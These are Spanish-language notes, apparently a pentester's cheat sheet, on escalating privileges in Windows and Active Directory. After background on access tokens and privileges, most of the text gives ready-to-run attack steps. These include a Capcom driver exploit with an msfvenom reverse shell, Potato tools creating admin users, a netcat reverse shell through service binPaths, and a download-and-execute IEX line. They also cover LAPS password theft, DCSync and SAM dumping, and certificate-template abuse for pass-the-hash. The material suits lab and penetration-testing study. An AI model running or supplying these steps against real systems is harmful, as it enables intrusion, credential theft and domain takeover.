# Escalación de privilegios en Windows 

Tags: #AD #Windows #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege

* [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Abusando de Tokens Windows - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

## Tokens de acceso 

Los tokens de acceso en Windows son estructuras de datos que almacenan la información de seguridad y de usuario asociada a un proceso o hilo. Estas estructuras son esenciales dentro del modelo de seguridad de Windows, ya que definen los derechos y privilegios asignados a un proceso o hilo específico en el sistema.

A continuación, se presentan detalles clave sobre los tokens de acceso en Windows:

```bash 
1. Tipos de Tokens: Hay dos tipos principales de tokens en Windows:
    
    - Token de usuario: Representa a un usuario que se ha autenticado con éxito. Está asociado con todos los procesos iniciados por ese usuario.
    - Token primario: Es el token asociado con un proceso cuando se inicia.
    - Token de impersonación: Permite a un hilo actuar con diferentes niveles de privilegio de su proceso contenedor. Es útil, por ejemplo, cuando un servicio necesita realizar tareas con privilegios diferentes.
        
    
2. Información en Tokens: Un token de acceso contiene información como:
    
    - Identificador de usuario (User SID): Identifica al usuario asociado con el token.
    - Grupos SID: Identifica a los grupos de los que el usuario es miembro.
    - Privilegios: Define acciones específicas que el usuario puede realizar, como apagar el sistema o cambiar la hora del sistema.
    - Tipo de token: Indica si el token es primario o de impersonación.
    - Nivel de impersonación: Si es un token de impersonation, este campo especifica el nivel (Anónimo, Identificación, Impersonación, Delegación).
    - Discretionary Access Control List (DACL): Especifica qué objetos puede acceder el portador del token y con qué permisos.
        
    
3. Impersonation: Esta es una característica clave en Windows que permite a un hilo tomar el token de otro usuario y "impersonarlo", es decir, actuar con los privilegios de ese usuario. Es útil en situaciones como servidores que necesitan acceder a recursos en nombre de un cliente.
    
4. Token Stealing: En el contexto de la seguridad, los tokens de acceso pueden ser objeto de abuso por parte de atacantes. Si un atacante logra comprometer un proceso o hilo con privilegios elevados, puede "robar" el token asociado y usarlo para impersonar a ese usuario o proceso de alto privilegio, facilitando la escalación de privilegios o el movimiento lateral.
    
5. Creación de Tokens: Los tokens de acceso se crean durante el proceso de autenticación. Cuando un usuario inicia sesión en una máquina Windows, el sistema genera un token de acceso que representa al usuario y a todos sus grupos y privilegios asociados.
    
6. Modificación de Tokens: A través de APIs específicas, es posible modificar tokens, aunque generalmente esto requiere privilegios elevados. Esta capacidad puede ser abusada por malware o atacantes para alterar los derechos y permisos de un token.
```

Los tokens de acceso desempeñan un papel fundamental en la infraestructura de seguridad de Windows. Brindan una notable flexibilidad para la gestión de identidades y accesos, aunque también pueden convertirse en un posible punto de ataque si no se manejan y protegen de forma adecuada. Por ello, es esencial que los administradores y expertos en seguridad entiendan su funcionamiento y las medidas necesarias para prevenir su uso indebido.

## Privilegios en Windows

* [Niveles de integridad - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels)

En los sistemas operativos Windows, los privilegios son permisos otorgados a las cuentas de usuario y servicios, los cuales determinan las acciones que pueden ejecutarse en el sistema. Estos privilegios regulan aspectos clave de la seguridad y la administración del sistema, permitiendo desde la modificación del reloj del sistema hasta la gestión de registros y configuraciones de seguridad. A continuación, te presento una lista de los privilegios disponibles en Windows, aunque es importante tener en cuenta que esta lista puede variar ligeramente según la versión del sistema operativo.

```bash 
1. SeAssignPrimaryTokenPrivilege: Asignar un token primario a un proceso.
2. SeAuditPrivilege: Generar eventos de auditoría de seguridad.
3. SeBackupPrivilege: Omitir comprobaciones de permisos para realizar operaciones de respaldo.
4. SeChangeNotifyPrivilege: Omitir la notificación de cambio de directorio.
5. SeCreateGlobalPrivilege: Crear objetos globales.
6. SeCreatePagefilePrivilege: Crear un archivo de paginación.
7. SeCreatePermanentPrivilege: Crear objetos permanentes.
8. SeCreateSymbolicLinkPrivilege: Crear enlaces simbólicos.
9. SeCreateTokenPrivilege: Crear un token de objeto.
10. SeDebugPrivilege: Depurar programas.
11. SeEnableDelegationPrivilege: Habilitar la delegación de seguridad.
12. SeImpersonatePrivilege: Impersonar a un cliente después de la autenticación.
13. SeIncreaseBasePriorityPrivilege: Aumentar la prioridad de proceso.
14. SeIncreaseQuotaPrivilege: Aumentar cuotas de proceso.
15. SeIncreaseWorkingSetPrivilege: Aumentar el conjunto de trabajo de un proceso.
16. SeLoadDriverPrivilege: Cargar y descargar controladores de dispositivos.
17. SeLockMemoryPrivilege: Bloquear páginas en memoria.
18. SeMachineAccountPrivilege: Agregar equipos al dominio.
19. SeManageVolumePrivilege: Realizar mantenimiento de volumen.
20. SeProfileSingleProcessPrivilege: Realizar monitoreo de rendimiento.
21. SeRelabelPrivilege: Modificar etiquetas de integridad de objetos.
22. SeRemoteShutdownPrivilege: Forzar el apagado desde un sistema remoto.
23. SeRestorePrivilege: Omitir comprobaciones de permisos para realizar operaciones de restauración.
24. SeSecurityPrivilege: Administrar auditoría y registro de seguridad.
25. SeShutdownPrivilege: Apagar el sistema.
26. SeSyncAgentPrivilege: Sincronizar datos de directorio.
27. SeSystemEnvironmentPrivilege: Modificar la configuración del entorno del firmware.
28. SeSystemProfilePrivilege: Realizar monitoreo de rendimiento del sistema.
29. SeSystemtimePrivilege: Cambiar la hora del sistema.
30. SeTakeOwnershipPrivilege: Tomar propiedad de archivos u otros objetos.
31. SeTcbPrivilege: Actuar como parte del sistema operativo.
32. SeTimeZonePrivilege: Cambiar la zona horaria.
33. SeTrustedCredManAccessPrivilege: Acceder a credenciales guardadas de manera segura.
34. SeUndockPrivilege: Desacoplar el sistema de la base.
35. SeUnsolicitedInputPrivilege: Leer la entrada no solicitada del terminal interactivo.
```  

Cada uno de estos privilegios otorga la capacidad de realizar acciones concretas en el sistema que pueden influir en su configuración, seguridad y funcionamiento general. Los administradores del sistema deben gestionar y asignar estos privilegios con cuidado para garantizar la seguridad y el correcto desempeño de los sistemas Windows.

## Privilegios Windows para escalar 

```bash 
❯ whoami /priv        # Muestra los privilegios del usuario actual 
```

```powershell 
1. 'SeLoadDriverPrivilege' = Permite 'cargar drivers firmados' que se ejecutan con permisos del 'kernel (ring 0)'. Si puedes cargar un 'driver malicioso' (uno que eleva privilegios), te puedes convertir en 'NT AUTHORITY\SYSTEM' o incluso ejecutar código arbitrario en el núcleo


Pasos:
❯ https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp    # Copiar el codigo en Visual studio creando un nuevo proyecto 'Aplicación de consola'. Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'EoPLoadDriver.exe' a la máquina Windows comprometida
❯ https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver    # Descargar el archivo 'Capcom.sys' y transferirlo a la máquina Windows comprometida

❯ .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys  # Cargar y ejecutar el driver en Windopws. Debe de mostrar lo siguiente: 'NTSTATUS: 00000000, WinError: 0'

❯ https://github.com/tandasat/ExploitCapcom   # Descargar el proyecto completo en zip para abrirlo desde Visual Studio. Modificar la linea de 'LaunchShell' y colocar "C:\\ProgramData\\reverse.exe". Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'ExploitCapcom.exe' a la máquina Windows comprometida

❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe  # Crear el archivo malicioso en Kali y transferirlo a la máquina Windows comprometida

❯ .\ExploitCapcom.exe        # Ejecutar el archivo en Windows y obtener la revershell en Kali 

Notas:
	1. Si al momento de compilar da un error, eliminar '#include "stdafx.h"' y volverlo a compilar
	2. La ruta donde compila los archivos Visual Studio los muestra por la consola 
	3. Para obtener la revershell se debe estar en escucha con 'Netcat'
```

```powershell
2. 'SetImpersonatePrivilege' = Abusando de 'SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege'. Si un usuario tiene los privilegios antes mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM


Pasos 'PetitPotato':
❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0   # Descargar el archivo y transferirlo a la máquina Windows comprometida 
❯ PetitPotato.exe 3 cmd         # Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System' 
	# EfsID = '3' es el numero de API a usar
❯ PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
❯ PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
❯ PetitPotato.exe 3 "net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
❯ PetitPotato.exe 3 "net user Omar"                             # Mirar el grupo de un usuario en especifico


Pasos 'JuicyPotato':
❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    # Descargar el archivo y transferirlo a la máquina Windows comprometida 
❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net user omar P4ssw0rd /add" -l 1337
# Ejecutar en Windows para crear un usuario
	# t = Crear un proceso 
	# p = Programa a ejecutar 
	# a = Argumento
	# l = Puerto de escucha COM 
❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net localgroup Administrators omar /add" -l 1337
❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
# Opcional en caso de que no deje ingresar y necesite el recurso compartido
❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  

Notas:
	1. Despues de crear un usuario para tener persistencia, podemos ingresar a con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 
	2. También se pude utilizar 'RottenPotato'
```

## Grupos Windows para escalar 

```bash 
❯ net user <user>     # Mirar los grupos del usuario 
```

```powershell
1. 'Azure Admins' = Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.


Pasos: 
❯ https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0   # Descargar el archivo AdDecrypt.zip y extraer su contenido para obtener 'AdDecrypt.exe, mcrypt.dll' y transferir los archivos a la máquina Windows comprometida
❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta en Windows para ejecutar el 'AdDecrypt.exe'
❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Administrator 

Notas: 
	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
```

```powershell 
2. 'Server Operators' = Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.


Pasos:
❯ nc.exe     # Descargar y tranferir el archivo a la máquina Windows comprometida para hacer la Revershell
❯ services   # Mirar todos los servicios que se estan ejecutando en Windows 
❯ sc.exe create <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Crear un servicio 
❯ sc.exe config <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Modificar un servicio 
❯ sc.exe stop <service>         # Detener un servicio 
❯ sc.exe start <service>        # Iniciar un servicio 

Notas:
	1. Antes de iniciar el servicio, en Kali se debe de estar en 'listening' con 'Netcat' para establecer la Revershell 
```

```powershell 
3. 'LAPS_Readers' =  Los miembros del grupo 'LAPS\Readers' tienen 'permiso de lectura' sobre los atributos de Active Directory donde se almacenan las 'contraseñas locales administradas automáticamente'. Por lo tanto, se puede leer la contraseña del administrador local de las máquinas unidas al dominio, conectarte con esa contraseña y tomar el control de la máquina como 'administrador local'.


Pasos:
❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el modulo 
❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
```

```powershell
4. 'Account Operators' = Si se esta en este grupo con derechos de 'GenericAll' sobre el grupo 'Exchange Windows Permissions' se puede crear un usuario y agregarlo al grupo. Además, si el grupo de 'Exchange Windows Permissions' tiene derechos de 'WriteDacl' sobre el dominio, se puede ejecutar un DCSync para obtener los hashes de todos los usuarios y hacer un Pass-The-Hash


Pasos:
❯ net user omar P4ssw0rd /add /domain       # Crear un usuario a nivel de dominio por pertenecer al grupo 'Account Operators' en Windows 
❯ net group "Exchange Windows Permissions" omar /add     # Agregar al usuario al grupo 'Exchange Windows Permissions'
❯ net group        # Mirar los grupos existentes 
❯ net user omar    # Mirar la info del usuario 


# Agregar el privilegio de DCSync al usuario  
❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
	# password = Contraseña del usuario 
❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
	# user = Usuario que se agrego en la variable $Cred

Notas: 
	1. El comando de 'Add-DomainObjectAcl' solo se puede ejecutar cuando se carga el módulo de 'PowerView.ps1'


# Hacer DCSync en Kali 
❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
	# IP-DC = La dirección IP del DC  
❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
```

```powershell 
5. 'Backup Operators' = El usuario en este grupo recibe los privilegios de 'SeBackupPrivilege y SeRestorePrivilege' y permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'


## FORMA 1
Pasos:   
❯ reg save hklm\sam C:\temp\sam.hive           # Hacer una copia de la SAM en Windows y descargarlo 
❯ reg save hklm\system C:\temp\system.hive     # Hacer una copia del system en Windows y descargarlo

❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 

Notas:
	1. https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md      # Forma de explotar 


## FORMA 2
Pasos:
❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    # Descargar la tool 

❯ python3 reg.py user:'passwd'@IP backup -p '\\IP\smbFolder'
	# user:passwd = Credenciales validas del usuario que se encuentra en el grupo 'Backup Operators'
	# IP = Dirección IP del DC
	# \\IP\share = Recurso compartido con la IP de Kali para recibir los archivos a descargar 
❯ impacket-smbserver smbFolder $(pwd) -smb2support    # Crear un server para recibir los archivos 'SAM, SECURITY y SYSTEM' y así poder hacer el dumpeo 

❯ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 

❯ impacket-secretsdump 'domain1.corp/user'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
	# hashes = Hash ':NT' del usuario 

Notas:
	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
```

```powershell 
6. 'Certificate Service DCOM Access' = Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
Esto significa que los usuarios de ese grupo pueden interactuar con la CA de forma remota (por ejemplo, para solicitar certificados). Además, debe de existir una plantilla vulnerable en la 'CA' como: 'Enrollee supplies subject, client authentication (OID)' y no tener restricciones de grupo


Pasos:
# Enumerar con Kali el 'AD CS' para ver si hay vulnerabilidades
❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP   
	# IP = Es la dirección IP del DC
	❯ cat file_certipy.txt | grep Vuln -C 50      # Mirar las 50 lineas donde existe la vulnerabilidad con el CA y el template 

❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca 'CA' -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar con Kali el certificado del usuario 'Administrator'
	# ca = Es el 'Certificate Authorities' y se encuentra en el archivo enumerado anteriormente 
	# template = Es la plantilla vulnerable y se encuentra en el archivo enumerado anteriormente
	# upn = El usuario al que queremos suplantar 
	# user = Es el usuario que se encuentra en el grupo 'Certificate Service DCOM Access' 
	
❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar con Kali el TGT  del usuario 'administrator' con el certificado 'PFX' y obtener el hash NTLM  

❯ impacket-wmiexec domain.corp/administrator@IP -no-pass -hashes 'LM:NT'    # Ingresar a Windows desde Kali con el usuario administrator 


Notas:
	1. Sincronizar Kali con el DC 
		❯ ntpdate IP_DC
	2. Al solicitar el certificado se debe de mostrar lo siguiente: 'Saved certificate and private key to administrator.pfx'
```